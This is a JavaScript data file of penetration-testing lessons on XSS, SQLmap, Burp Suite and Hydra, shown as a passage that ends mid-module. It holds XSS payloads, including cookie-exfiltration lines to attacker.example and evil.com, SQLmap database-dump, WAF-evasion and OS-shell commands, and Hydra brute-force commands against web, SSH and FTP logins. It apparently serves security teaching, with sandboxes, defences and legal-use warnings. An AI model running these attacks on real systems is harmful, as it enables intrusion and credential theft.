    { title: 'Reflected XSS: Script Tag', desc: 'Now try the classic proof-of-concept payload. Inside the sandbox this triggers a JavaScript <code>alert()</code>, confirming arbitrary script execution in the page context.', code: { lang: 'html', text: '<script>alert(\'xss\')</script>' } },
    { title: 'Bypass a Script-Tag Filter', desc: 'Many naive filters only strip literal <code>&lt;script&gt;</code> tags. An <code>&lt;img&gt;</code> tag with a broken <code>src</code> fires its <code>onerror</code> handler instead — no <code>&lt;script&gt;</code> tag needed:', code: { lang: 'html', text: "<img src=x onerror=alert('xss')>" } },
    { title: 'Stored XSS (Conceptually)', desc: 'Reflected XSS requires tricking one victim into clicking a crafted link. <strong>Stored XSS</strong> is worse: the payload is saved server-side (in a comment, profile field, or review) and fires automatically for every visitor — including an administrator — who later views that page. The sandbox simulates the reflected case; the payload behaves identically once a script actually executes.', code: null },
    { title: 'DOM-Based XSS', desc: '<strong>DOM-based XSS</strong> never touches the server at all — the entire data flow happens client-side in the browser. With a <code>#</code> URL fragment as the source, the part after <code>#</code> is never even sent to the server; client-side JavaScript reads it directly from <code>location.hash</code> and writes it into a dangerous sink. Note that <code>innerHTML</code> does <em>not</em> execute an injected <code>&lt;script&gt;</code> tag by itself — browsers block that specific case — so a real DOM-XSS payload against an <code>innerHTML</code> sink uses an event-handler vector like <code>&lt;img onerror&gt;</code> instead:', code: { lang: 'javascript', text: "// Vulnerable sink:\ndocument.getElementById('results').innerHTML = decodeURIComponent(location.hash.slice(1));\n\n// Triggered by visiting:\n// https://target.example/page#<img src=x onerror=alert('xss')>" } },
    { title: 'What a Stolen Cookie Attack Looks Like', desc: 'The most common real-world XSS goal is session hijacking. An attacker-controlled script reads <code>document.cookie</code> and sends it to a server they control. This only works against cookies that are <em>not</em> flagged <code>HttpOnly</code> (see the defenses below) — in the sandbox below, this exact payload will not steal anything: the iframe has no <code>allow-same-origin</code>, so it runs with an opaque (null) origin, and reading <code>document.cookie</code> from an opaque origin throws a <code>SecurityError</code> instead of returning a value. There are no real cookies to read here:', code: { lang: 'html', text: '<script>fetch("https://attacker.example/steal?c=" + document.cookie)</script>' } },
    { title: 'Try It — XSS Injection Sandbox', desc: 'Scroll down to the <strong>XSS Injection Sandbox</strong> below and inject each payload yourself, or click one of the quick-payload chips. The sandbox renders your payload inside a restricted iframe (<code>sandbox="allow-scripts allow-modals"</code>) — scripts execute and alerts show, so injection itself is real, but the iframe\'s opaque origin means there are no real cookies to read and nothing meaningful to steal.', code: null },
    { title: 'Common Mistakes', desc: '<strong>1)</strong> Confusing "my alert popped up" with "this is exploitable in production" — a proof-of-concept alert only proves script execution; a real impact still needs a realistic delivery path (a link a victim clicks, or a stored field an admin views).<br><br><strong>2)</strong> Assuming encoding on the server stops client-side DOM XSS — DOM-based XSS lives entirely in the browser\'s own JavaScript and is untouched by server-side output encoding.<br><br><strong>3)</strong> Testing only in the context you see — the same raw input might be safely encoded inside a <code>&lt;p&gt;</code> tag but dangerous inside an <code>onclick=""</code> attribute or a <code>&lt;script&gt;</code> block; always test every context separately.', code: null },
    { title: 'Legal Use Only', desc: 'Only inject payloads into the XSS Injection Sandbox below, or into applications you own or are explicitly authorised to test. Injecting scripts into a real website or another person\'s session without permission is illegal.', code: null }
  ],

  defense: [
    { title: 'Context-Aware Output Encoding', desc: 'Never trust user input. Before rendering data in the browser, encode it according to where it will be placed (HTML body, attribute, JavaScript variable). Use framework features like React or Angular that auto-escape by default.' },
    { title: 'Content Security Policy (CSP)', desc: 'A strict CSP prevents the browser from executing inline scripts and restricts where external scripts can be loaded from. It acts as a defense-in-depth layer against XSS.' },
    { title: 'HttpOnly Cookies', desc: 'Set the <code>HttpOnly</code> flag on session cookies. This prevents client-side JavaScript (and therefore XSS attacks) from accessing the cookie.' },
    { title: 'Sanitization', desc: 'If you must allow users to submit rich text (HTML), use a robust sanitization library like DOMPurify to strip out dangerous tags and attributes (like <code>&lt;script&gt;</code> or <code>onerror</code>).' }
  ],

  payloads: { headers: ['Payload', 'Type / Purpose', 'Description'], rows: [
    ['&lt;script&gt;alert(1)&lt;/script&gt;',             'Basic',        'The classic proof of concept. Executes a simple alert box.'],
    ['&lt;img src=x onerror=alert(1)&gt;',                'Image Vector', 'Executes JavaScript when the browser fails to load the fake image source.'],
    ['&lt;iframe src="javascript:alert(1)"&gt;',           'Iframe',       'Executes script within an iframe. Often bypasses basic regex filters.'],
    ['&lt;svg onload=alert(1)&gt;',                       'SVG Vector',   'Executes script when the SVG element finishes loading.'],
    ['"&gt;&lt;script&gt;alert(1)&lt;/script&gt;',        'Break Out',    'Closes an existing HTML attribute/tag before injecting the payload.'],
    ['javascript:alert(1)',                                'URI Scheme',   'Used in href or src attributes that expect a URL.'],
    ['&lt;script&gt;fetch("http://evil.com/?c="+document.cookie)&lt;/script&gt;', 'Exfiltration', 'Steals the session cookie and sends it to the attacker.']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// RED 04: SQLmap — Automated SQL Injection
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'sqlmap', track: 'red', num: '04', short: 'sqlmap',
  title: 'SQLmap — Automated SQL Injection',
  subtitle: 'After understanding manual SQLi, learn how SQLmap automates detection, exploitation, and full database extraction.',
  tag: 'Red 04 — Automation & Tooling',

  concept: [
    `<strong>SQLmap</strong> is an open-source penetration testing tool that automates the entire SQL Injection lifecycle — detection, exploitation, and data extraction. It is pre-installed on Kali Linux.`,
    `It supports all major injection techniques: <strong>boolean-based blind</strong>, <strong>time-based blind</strong>, <strong>error-based</strong>, <strong>UNION-based</strong>, and <strong>stacked queries</strong>. SQLmap automatically fingerprints the database engine (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and adjusts its payloads accordingly.`,
    `<strong>Why use it after learning manual SQLi?</strong> Manual injection teaches you the underlying mechanics — you understand <em>why</em> things work. SQLmap then lets you scale that knowledge efficiently: it tests hundreds of payloads in seconds, handles encoding/escaping edge cases, and can dump entire databases automatically.`,
    `SQLmap can also read/write files on the server filesystem, execute OS commands (if the DB user has sufficient privileges), and even spawn an interactive shell — making it one of the most powerful tools in a pentester's toolkit.`
  ],

  analogy: { emoji: '🤖', text: `You've just learned to pick a single lock by hand — you understand how the pins work, how tension wrenches apply pressure, and how to feel for the click. SQLmap is like a robotic lockpicking machine that can test every pin combination across every lock in the building in minutes. It uses the same techniques you learned by hand, but at machine speed. You still need to understand the fundamentals to interpret results and troubleshoot failures.` },

  steps: [
    { title: 'Install SQLmap', desc: 'SQLmap ships pre-installed on Kali Linux — confirm with <code>sqlmap --version</code> in a terminal. On Debian/Ubuntu it is also packaged directly. On macOS, Homebrew carries it. On any OS with Python 3 installed (including Windows), the project\'s own documented method is cloning the GitHub repository and invoking the script directly — no package manager required.', code: { lang: 'bash', text: '# Kali (already present)\nsqlmap --version\n\n# Debian / Ubuntu\nsudo apt install sqlmap\n\n# macOS (Homebrew)\nbrew install sqlmap\n\n# Any OS with Python 3 (official method, incl. Windows)\ngit clone --depth 1 https://github.com/sqlmapproject/sqlmap.git\ncd sqlmap\npython3 sqlmap.py --version' } },
    { title: 'Identify an Injectable Parameter', desc: 'SQLmap does not find vulnerable parameters out of thin air — you point it at one. Use the manual testing from the SQLi module (a <code>&#39;</code> that breaks the query, or an error you provoked) to confirm a parameter is worth automating, for example a query-string <code>id</code> on a neutral practice target:', code: { lang: 'text', text: 'http://shop.local/item?id=1' } },
    { title: 'Scan a GET Parameter with -u', desc: 'The <code>-u</code> flag gives SQLmap a target URL. With nothing else, SQLmap sends GET requests and tests every parameter in the query string it can find — here, <code>id</code>:', code: { lang: 'bash', text: 'sqlmap -u "http://shop.local/item?id=1"' } },
    { title: 'Testing a POST Body with --data', desc: 'For a login form or any POST endpoint, pair <code>-u</code> with <code>--data</code> — a URL-encoded body string. SQLmap sends it as a POST request and tests every parameter inside the body instead of the query string:', code: { lang: 'bash', text: 'sqlmap -u "http://shop.local/login" --data="email=test@shop.local&password=test"' } },
    { title: 'Scanning a Saved Request with -r', desc: 'For anything more complex — custom headers, cookies, a JSON body, multiple parameters — building the right <code>--data</code> string by hand gets tedious. The <code>-r</code> flag instead loads a complete raw HTTP request (request line, headers, and body together) straight from a text file, and SQLmap tests every parameter it finds in it. The next module (Burp Suite) lets you save exactly this kind of file from its Proxy or Repeater with "Save item" — for now, you can write one by hand the same way the Proxy Intercept Lab in that module builds one:', code: { lang: 'http', text: 'POST /login HTTP/1.1\nHost: shop.local\nContent-Type: application/json\nContent-Length: 46\n\n{"email":"test@shop.local","password":"test"}' } },
    { title: 'Run Non-Interactively with --batch', desc: 'By default SQLmap pauses and asks a yes/no question at several points (e.g., whether to test a particular technique). <code>--batch</code> tells it to always accept its own suggested default answer instead of waiting for you — essential once you start scripting SQLmap or running it unattended.', code: { lang: 'bash', text: 'sqlmap -r request.txt --batch' } },
    { title: 'Control Test Depth with --level and --risk', desc: '<code>--level</code> (1–5, default 1) controls how thoroughly SQLmap looks for injection points — higher levels also test cookies, the User-Agent, and Referer headers, not just the obvious GET/POST parameters. <code>--risk</code> (1–3, default 1) controls how aggressive the payloads themselves are — higher risk levels include OR-based payloads that can alter more rows than intended, and heavier time-based queries. Only raise <code>--risk</code> above 1 against a system you are explicitly authorised to test, or the built-in simulator.', code: { lang: 'bash', text: 'sqlmap -r request.txt --level=3 --risk=2 --batch' } },
    { title: 'Enumerate Databases, Tables, and Columns', desc: 'Once SQLmap confirms the injection point, walk the database structure step by step: <code>--dbs</code> lists every database on the server; <code>-D &lt;name&gt;</code> picks one to enumerate further; <code>-T &lt;name&gt;</code> (used with <code>-D</code>) picks a table and lists its columns with <code>--columns</code>; <code>-C col1,col2</code> narrows a later <code>--dump</code> to specific columns instead of the whole table.', code: { lang: 'bash', text: 'sqlmap -r request.txt --dbs\nsqlmap -r request.txt -D shopdb --tables\nsqlmap -r request.txt -D shopdb -T users --columns' } },
    { title: 'Dump the Data', desc: 'With a database and table selected, <code>--dump</code> extracts the actual rows. Add <code>-C</code> to limit the dump to the columns you care about. SQLmap will also try to crack any password hashes it recognises using its own built-in dictionary — this only succeeds against common, weak passwords, not strong unique ones.', code: { lang: 'bash', text: 'sqlmap -r request.txt -D shopdb -T users -C email,password --dump' } },
    { title: 'Evade Filters with --tamper and --technique', desc: '<code>--tamper=&lt;script&gt;</code> rewrites the payload using one of SQLmap\'s built-in tamper scripts to slip past a basic WAF or input filter — <code>space2comment</code>, for example, replaces literal spaces with <code>/**/</code> comments. <code>--technique=&lt;letters&gt;</code> restricts SQLmap to specific injection techniques instead of trying all of them: <code>B</code>oolean-blind, <code>E</code>rror-based, <code>U</code>nion query, <code>S</code>tacked queries, <code>T</code>ime-blind, <code>Q</code>uery-based (inline). Restricting the technique speeds up a scan once you already know which one works.', code: { lang: 'bash', text: 'sqlmap -r request.txt --tamper=space2comment --technique=U --batch' } },
    { title: 'Blend In with --random-agent', desc: '<code>--random-agent</code> picks a random, realistic browser User-Agent string from SQLmap\'s own built-in list for every request, instead of SQLmap\'s own distinctive default User-Agent — useful when a WAF or log reviewer is specifically looking for SQLmap\'s signature.', code: { lang: 'bash', text: 'sqlmap -r request.txt --random-agent --batch' } },
    { title: 'Reading the Output', desc: 'SQLmap prints its progress as it works, then a summary once it confirms an injection point.<br><br><strong>The "testing" lines</strong>: SQLmap first confirms the target responds consistently, then walks through each injection technique it knows (boolean-blind, time-blind, UNION, …) against the parameter.<br><br><strong>"sqlmap identified the following injection point(s)"</strong>: for each technique that worked, SQLmap prints the exact payload it used and the parameter it attacked.<br><br><strong>"the back-end DBMS is …"</strong>: SQLmap fingerprints the database engine from how it responded to engine-specific payloads (e.g. MySQL\'s <code>SLEEP()</code>).<br><br><strong>"available databases"</strong>, <strong>table/column lists</strong>, and <strong>dumped rows</strong> only appear when you pass <code>--dbs</code>, <code>--tables</code>/<code>--columns</code>, or <code>--dump</code> respectively — SQLmap never fetches more than you ask for.', code: { lang: 'text', text: "[*] testing if the target URL content is stable... yes\n[*] testing if GET parameter 'id' is dynamic... yes\n[*] testing for SQL injection on GET parameter 'id'\n[*] GET parameter 'id' appears to be Boolean-based injectable\n[*] GET parameter 'id' appears to be Time-based injectable (stacked queries)\n[*] target URL appears to be UNION injectable with 3 columns\n\nsqlmap identified the following injection point(s):\n---\nParameter: id (GET)\n    Type: boolean-based blind\n    Payload: id=1 AND 1871=1871\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: id=NULL UNION ALL SELECT NULL,CONCAT(0x7162717071,...),NULL--\n---\n[*] the back-end DBMS is MySQL >= 5.0 (MariaDB fork)" } },
    { title: 'Common Mistakes', desc: '<strong>1)</strong> Forgetting <code>--batch</code> in a script or CI job — SQLmap then sits waiting at its first yes/no prompt forever, looking "stuck" when it is really just waiting on stdin.<br><br><strong>2)</strong> Using <code>-u</code> against a POST endpoint without <code>--data</code> — SQLmap sends a plain GET and may report "not injectable" even though the real vulnerability is in the POST body.<br><br><strong>3)</strong> Assuming <code>--dump</code> instantly cracks every password hash — it only recognises and cracks common/weak passwords against its own small built-in dictionary; a strong unique password stays a hash.<br><br><strong>4)</strong> Running <code>--dump</code> with no <code>-D</code>/<code>-T</code> selected — SQLmap will try to enumerate and dump everything it can reach, which is slow, noisy, and usually not what you wanted.', code: null },
    { title: 'Try It — Interactive SQLmap Terminal', desc: 'Scroll down to the <strong>Interactive SQLmap Terminal</strong> below this tutorial and run real SQLmap syntax against it. It recognises a command as a scan once it sees either a quoted <code>http://</code>/<code>https://</code> URL after <code>-u</code>, or the literal <code>-r </code> flag, then prints a simulated scan ending in a confirmed injection point. <code>--dbs</code>, <code>-D</code>, <code>--tables</code>, <code>-T</code>, <code>--columns</code>, <code>--dump</code>, <code>-b</code>/<code>--banner</code>, <code>--current-user</code>, and <code>--current-db</code> each add their matching section to the output. <code>--batch</code>, <code>--level</code>, <code>--risk</code>, <code>--tamper</code>, <code>--technique</code>, and <code>--random-agent</code> are accepted without error (good habit to type them!) but the simulator always returns the same successful run regardless of their values — it does not model WAF evasion or detection difficulty. Try these in turn:', code: { lang: 'bash', text: 'sqlmap -u "http://shop.local/item?id=1"\nsqlmap -u "http://shop.local/item?id=1" --dbs\nsqlmap -u "http://shop.local/item?id=1" -D shopdb --tables\nsqlmap -u "http://shop.local/item?id=1" -D shopdb -T users --dump' } },
    { title: 'Legal Use Only', desc: 'Only point SQLmap at a target you <strong>own</strong> or are <strong>explicitly authorised</strong> to test, or at the built-in simulator above — including with <code>--batch</code> and higher <code>--risk</code> values, which can modify data on a real, fragile database. SQLmap against a system you do not control is illegal in most jurisdictions, whether or not it finds anything.', code: null }
  ],

  defense: [
    { title: 'Same Defenses as Manual SQLi', desc: 'All defenses from the SQL Injection module apply — parameterized queries, input validation, least-privilege DB accounts, and WAFs are your primary protections.' },
    { title: 'Rate Limiting', desc: 'SQLmap sends many rapid requests. Rate limiting and anomaly detection can flag or block automated scanning patterns.' },
    { title: 'Intrusion Detection Systems (IDS)', desc: 'Tools like Snort or Suricata can detect SQLmap\'s signature patterns (user-agent strings, payload patterns) and alert security teams.' },
    { title: 'Disable Detailed Error Messages', desc: 'Error-based SQLi relies on the server exposing database errors. Configure the application to show generic error pages in production.' }
  ],

  payloads: { headers: ['Flag', 'Purpose', 'Example'], rows: [
    ['-u URL',          'Target URL containing the parameter to test',               'sqlmap -u "http://shop.local/item?id=1"'],
    ['-r FILE',         'Load a complete raw HTTP request (headers + body) from a file', 'sqlmap -r request.txt'],
    ['--data=STR',      'Send this body as a POST request and test its parameters', 'sqlmap -u "http://shop.local/login" --data="email=a&password=b"'],
    ['--dbs',           'Enumerate all databases on the server',                     'sqlmap -u URL --dbs'],
    ['-D DB',           'Select a database to enumerate further',                    'sqlmap -u URL -D shopdb --tables'],
    ['-T TBL',          'Select a table within -D to enumerate further',             'sqlmap -u URL -D shopdb -T users --columns'],
    ['-C COL1,COL2',    'Limit a later --dump to specific columns within -T',        'sqlmap -u URL -D shopdb -T users -C email,password --dump'],
    ['--dump',          'Extract (dump) data from the selected table/columns',       'sqlmap -u URL -D shopdb -T users --dump'],
    ['--batch',         'Never prompt — accept SQLmap\'s own default answer',        'sqlmap -r req.txt --batch'],
    ['--level=N',       'Test thoroughness, 1-5 (default 1) — higher also tests cookies/headers', 'sqlmap -u URL --level=5'],
    ['--risk=N',        'Payload aggressiveness, 1-3 (default 1) — higher = riskier payloads', 'sqlmap -u URL --risk=3'],
    ['--tamper=SCRIPT', 'Rewrite the payload with a tamper script to dodge basic WAFs',  'sqlmap -u URL --tamper=space2comment'],
    ['--technique=BEUSTQ', 'Restrict to specific technique letters (Boolean/Error/Union/Stacked/Time/Query)', 'sqlmap -u URL --technique=U'],
    ['--random-agent',  'Send a random, realistic browser User-Agent on every request', 'sqlmap -u URL --random-agent'],
    ['--forms',         'Auto-detect and test HTML forms on a page',                 'sqlmap -u "http://shop.local/login" --forms'],
    ['--cookie=C',      'Set the HTTP Cookie header for authenticated testing',      'sqlmap -u URL --cookie="session=abc"'],
    ['--threads=N',     'Parallelise requests across N threads (default 1, max 10)','sqlmap -u URL --threads=10'],
    ['--os-shell',      'Attempt to spawn an interactive OS shell (needs file-write privileges on the DB)', 'sqlmap -u URL --os-shell']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// RED 05: Burp Suite Proxy Interception
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'burp-proxy', track: 'red', num: '05', short: 'burp',
  title: 'Burp Suite Proxy Interception',
  subtitle: 'Learn how web proxies capture, inspect, and modify HTTP traffic between your browser and a target application.',
  tag: 'Red 05 — Proxy Fundamentals',

  concept: [
    `Every time you visit a website, your browser sends an <strong>HTTP request</strong> to a server, which replies with an <strong>HTTP response</strong>. Normally this exchange is invisible — it happens in milliseconds behind the scenes.`,
    `A <strong>web proxy</strong> is software that sits <em>between</em> your browser and the server. It intercepts every request and response, letting you read, modify, or replay them before they reach their destination.`,
    `<strong>Burp Suite</strong> is the industry-standard web proxy for penetration testers. When you enable its <strong>Intercept</strong> feature, every outbound request from Burp's built-in Chromium browser is paused and displayed in a raw text editor. You can change parameters, headers, or the body — then forward the modified request to the server.`,
    `This gives you complete control over the conversation between client and server, which is the foundation of almost every web application attack.`
  ],

  analogy: { emoji: '📬', text: `Imagine a postal inspector stationed at a sorting facility. Every letter (HTTP request) leaving your house passes through the inspector's desk. They can open the envelope, read the contents, change the delivery address, swap the letter inside, or simply let it pass through. The recipient (server) has no idea the letter was ever touched. That inspector is your Burp Suite proxy.` },

  steps: [
    { title: 'Install Burp Suite Community Edition', desc: 'Burp Suite Community Edition ships pre-installed on Kali Linux — find it in the Applications menu or run <code>burpsuite</code>. On your own machine, download the free Community Edition installer from PortSwigger (<a href="https://portswigger.net/burp/communitydownload">portswigger.net/burp/communitydownload</a>) for Windows, macOS, or Linux, then run it. On first launch, accept the license, choose <strong>"Temporary project"</strong> (Community Edition cannot save a project to disk — it always starts fresh), and <strong>"Use Burp defaults"</strong>, then click <strong>"Start Burp"</strong>.', code: null },
    { title: 'Open Burp\'s Built-in Browser', desc: 'Navigate to the <strong>Proxy</strong> tab and click <strong>"Open browser"</strong>. This opens a Chromium instance pre-configured to route all its traffic through Burp and to already trust Burp\'s CA certificate — no manual setup needed, which is why most people use it instead of their everyday browser.', code: null },
    { title: 'Or Point Your Own Browser at Burp', desc: 'If you\'d rather use your normal browser, Burp\'s proxy listener runs on <code>127.0.0.1:8080</code> by default — set that as your browser\'s HTTP and HTTPS proxy. HTTPS sites will then show certificate warnings until you trust Burp\'s CA certificate: with the proxy active, visit the special address <code>http://burp</code>, download the certificate, and import it into your browser\'s or OS trust store (in Firefox: Settings → Privacy & Security → Certificates → View Certificates → Import).', code: null },
    { title: 'Enable Intercept Mode', desc: 'In the <strong>Proxy → Intercept</strong> sub-tab, click the toggle so it reads <strong>"Intercept is on"</strong>. From this moment, every HTTP request from the browser you configured will be paused and shown to you before it leaves your machine.', code: null },
    { title: 'Browse to Your Target', desc: 'With Intercept on, navigate to any site you own or are explicitly authorised to test. The page will appear to hang — that\'s expected, Burp is holding the request until you act on it. If you don\'t have a live target handy, skip straight to the <strong>Proxy Intercept Practice Lab</strong> below: it simulates this exact intercept → inspect → forward flow entirely offline.', code: null },
    { title: 'Inspect the Intercepted Request', desc: 'Switch back to the Burp window. You\'ll see the raw request in the Intercept panel. Study its structure — the request line (method, path, HTTP version), the <code>Host</code> header, <code>User-Agent</code>, any cookies, and the body on a POST.', code: { lang: 'http', text: 'GET / HTTP/1.1\nHost: shop.local\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\nAccept: text/html,application/xhtml+xml\nAccept-Language: en-US,en;q=0.9\nConnection: keep-alive' } },
    { title: 'Forward and Observe the Response', desc: 'Click <strong>"Forward"</strong> to send the request on to the server. Click <strong>"Drop"</strong> instead if you want to cancel a request entirely without it ever reaching the server. Either way, check the <strong>HTTP history</strong> sub-tab afterwards to see the request and the server\'s response together — status code, headers, and body.', code: null },
    { title: 'Modify a Request In-Flight: Reuse Your SQLi Payloads', desc: 'This is the core skill behind every subsequent module: change a value in the raw editor before clicking Forward. Recall the authentication-bypass tautology from the SQLi module — try it here as a login body instead of a form field:', code: { lang: 'http', text: 'POST /login HTTP/1.1\nHost: shop.local\nContent-Type: application/json\n\n{"email":"admin@shop.local\'--","password":"anything"}' } },
    { title: 'Test for Logic Flaws: Tampered Price', desc: 'A common vulnerability is trusting the client (browser) to enforce business rules. A checkout UI might refuse to let you type a negative quantity or a zero price, but that is only a client-side restriction — intercept the request that actually submits the order and change the value directly before forwarding it, to see whether the server re-validates it.', code: { lang: 'json', text: '{"productId": 1, "quantity": 1, "price": 0}' } },
    { title: 'Test for Logic Flaws: Spoofed Access-Control Header', desc: 'Some applications make access decisions based on a client-supplied header instead of the actual connection — a classic example is trusting <code>X-Forwarded-For</code> to decide whether a request "came from localhost". Add the header in the raw editor before forwarding and see whether the server\'s response changes:', code: { lang: 'http', text: 'X-Forwarded-For: 127.0.0.1' } },
    { title: 'Using Burp Repeater', desc: 'Find any request in your <strong>HTTP history</strong>, right-click, and choose <strong>"Send to Repeater"</strong>. Repeater lets you replay that exact request as many times as you like, tweaking one value at a time and instantly seeing the new response — without intercepting and re-submitting from the browser each time.', code: null },
    { title: 'Burp Intruder — and Community\'s Limits', desc: 'Repeater is for one request at a time; <strong>Intruder</strong> automates testing many payloads against positions you mark with <code>§</code> in a request (for example, fuzzing a parameter with a wordlist). Community Edition deliberately throttles Intruder\'s attack speed and has no Scanner (automated vulnerability scanning) and no way to save a project to disk — those are Burp Suite Professional/Enterprise features. For a real password-guessing attack at speed, a dedicated tool like Hydra (the next module) is the better fit.', code: null },
    { title: 'Common Mistakes', desc: '<strong>1)</strong> Leaving Intercept on while browsing normally — every single request, including images and scripts, pauses and waits for you, which makes ordinary browsing painful. Toggle it off when you\'re not actively testing.<br><br><strong>2)</strong> Forgetting to import and trust Burp\'s CA certificate when using your own browser instead of Burp\'s built-in one — HTTPS sites throw certificate warnings or refuse to load entirely.<br><br><strong>3)</strong> Treating "I can send any header or value through Burp" as proof of a vulnerability — the client can always send anything; the vulnerability only exists if the <em>server</em> actually trusts it, so always check the response.<br><br><strong>4)</strong> Expecting Intruder to run at full speed in Community Edition — the throttling is intentional, not a bug.', code: null },
    { title: 'Try It — Proxy Intercept Practice Lab and the Standalone Burp Lab', desc: 'Scroll down to the <strong>Proxy Intercept Practice Lab</strong> below this tutorial: submit the simulated login form, then edit the intercepted request before clicking Forward. The lab recognises a SQLi-style break-out in the body, an <code>admin@</code> email, a JSON <code>"price"</code> value at or below zero, and an <code>X-Forwarded-For: 127.0.0.1</code> header — each produces its own simulated server response. Further down the Interactive Challenges list, launch the standalone <strong>Burp Suite Lab</strong> for a fuller intercept walkthrough, plus the dedicated <strong>Price Tampering</strong>, <strong>Cookie Manipulation</strong>, and <strong>Header Manipulation</strong> labs for each logic flaw above. All run entirely offline.', code: null },
    { title: 'Legal Use Only', desc: 'Only intercept and modify traffic for sites and applications you <strong>own</strong> or are <strong>explicitly authorised</strong> to test — or the built-in labs above. Intercepting and tampering with someone else\'s traffic without permission is illegal, even if nothing is ultimately broken.', code: null }
  ],

  defense: [
    { title: 'HTTPS / TLS Encryption', desc: 'Encrypt all traffic with TLS certificates. Even if intercepted on the network, the data is unreadable without the private key. Always redirect HTTP to HTTPS.' },
    { title: 'HTTP Strict Transport Security (HSTS)', desc: 'Set the <code>Strict-Transport-Security</code> header so browsers refuse to connect over plain HTTP after the first visit.' },
    { title: 'Certificate Pinning', desc: 'Mobile apps can pin the server\'s exact certificate, rejecting proxy certificates like Burp\'s. This prevents MITM on production mobile traffic.' },
    { title: 'Input Validation on the Server', desc: 'Never trust client-side data. Validate and sanitize every parameter on the server — a proxy can bypass any client-side checks (like min/max length, regex, or dropdown restrictions).' }
  ],

  payloads: { headers: ['Item', 'Description', 'Example'], rows: [
    ['GET',           'Retrieves a resource from the server',                      'GET /api/users HTTP/1.1'],
    ['POST',          'Sends data to the server (login forms, file uploads)',       'POST /login HTTP/1.1'],
    ['PUT',           'Replaces an entire resource on the server',                 'PUT /api/users/1 HTTP/1.1'],
    ['DELETE',        'Removes a resource from the server',                        'DELETE /api/users/1 HTTP/1.1'],
    ['Host',          'Header specifying the target domain',                       'Host: shop.local'],
    ['Cookie',        'Header carrying session tokens',                            'Cookie: token=abc123'],
    ['Content-Type',  'Header declaring the format of the request body',           'Content-Type: application/json'],
    ['Authorization', 'Header carrying credentials (Basic, Bearer, etc.)',         'Authorization: Bearer eyJhb...'],
    ['200 OK',        'Server processed the request successfully',                 'HTTP/1.1 200 OK'],
    ['301 Redirect',  'Resource moved permanently to another URL',                 'HTTP/1.1 301 Moved Permanently'],
    ['403 Forbidden', 'Server refuses to authorize the request',                   'HTTP/1.1 403 Forbidden'],
    ['500 Server Error','Unexpected error on the server side',                     'HTTP/1.1 500 Internal Server Error']
  ]}
},

// ─────────────────────────────────────────────────────────────────────────────
// RED 06: Brute Force with Hydra
// ─────────────────────────────────────────────────────────────────────────────
{
  id: 'hydra', track: 'red', num: '06', short: 'hydra',
  title: 'Brute Force Attacks with Hydra',
  subtitle: 'Learn how password guessing attacks work, how to use Hydra for HTTP, SSH, and FTP brute forcing, and how to defend against them.',
  tag: 'Red 06 — Credential Attacks',

  concept: [
    `<strong>Brute force attacks</strong> are a category of attacks where the attacker systematically tries every possible combination of credentials until finding the correct one. In practice, attackers don't try truly random combinations — they use <strong>wordlists</strong> (dictionaries of common passwords and usernames).`,
    `<strong>Hydra</strong> (also called THC-Hydra) is a fast, parallelised network login cracker pre-installed on Kali Linux. It supports over 50 protocols including HTTP, HTTPS, SSH, FTP, MySQL, RDP, SMB, and many more. It can test thousands of username/password combinations per minute.`,
    `The basic concept is simple: Hydra takes a <strong>target</strong> (IP + port), a <strong>protocol</strong> (SSH, HTTP-form, FTP, etc.), a <strong>username or username list</strong>, and a <strong>password or password list</strong>. It then tries every combination, watching for successful logins.`,
    `<strong>Wordlists</strong> are critical. Kali Linux ships with several built-in wordlists in <code>/usr/share/wordlists/</code>. The most famous is <code>rockyou.txt</code> (14 million leaked passwords). You can also generate custom wordlists with tools like <code>crunch</code> or <code>cewl</code> (which scrapes words from a target website).`
  ],

  analogy: { emoji: '🔑', text: `Imagine you're locked out of your house and you have a massive keyring with 10,000 keys. You try each key one by one until the door opens. A brute force attack works the same way — except Hydra can try hundreds of "keys" (passwords) per second across the network. The bigger and smarter your keyring (wordlist), the faster you'll find the right key. Strong, unique passwords are like having a lock that requires a key shape none of those 10,000 keys match.` },

  steps: [
    { title: 'Locate Wordlists on Kali', desc: 'Kali Linux ships with wordlists in <code>/usr/share/wordlists/</code>. The most important one is <code>rockyou.txt</code>, which may need to be unzipped first:', code: { lang: 'bash', text: '# List available wordlists:\nls /usr/share/wordlists/\n\n# Unzip rockyou.txt if needed:\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz\n\n# Check word count:\nwc -l /usr/share/wordlists/rockyou.txt\n# Output: 14344392 (14+ million passwords)' } },
    { title: 'Brute Force DVWA Login (Standard HTML Form)', desc: 'DVWA uses a traditional HTML POST form. You need three things: the login URL, the form field names, and the error message for failed logins. The <code>http-post-form</code> module handles this syntax.', code: { lang: 'bash', text: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  localhost -s 8080 \\\n  http-post-form \\\n  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"' } },
    { title: 'Brute Force Juice Shop (JSON API)', desc: 'Juice Shop is a modern app that uses JSON APIs instead of standard forms. Hydra supports JSON POST data directly. Note how the colon syntax is used to pass the JSON string and the "Invalid email or password" failure string.', code: { lang: 'bash', text: 'hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt \\\n  localhost -s 3000 \\\n  http-post-form \\\n  "/rest/user/login:{\\"email\\":\\"^USER^\\",\\"password\\":\\"^PASS^\\"}:Invalid email or password:H=Content-Type: application/json"' } },
    { title: 'Brute Force SSH', desc: 'SSH brute forcing is straightforward — just specify the target IP and protocol. Use <code>-t</code> to limit parallel threads (SSH servers often limit concurrent connections):', code: { lang: 'bash', text: '# Single username, password list:\nhydra -l root -P /usr/share/wordlists/rockyou.txt \\\n  ssh://192.168.1.1 -t 4\n\n# Username list + password list:\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\\n  ssh://192.168.1.1 -t 4' } },
    { title: 'Brute Force FTP', desc: 'FTP is another common target, especially on older systems. The syntax is identical — just change the protocol:', code: { lang: 'bash', text: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  ftp://192.168.1.1' } },
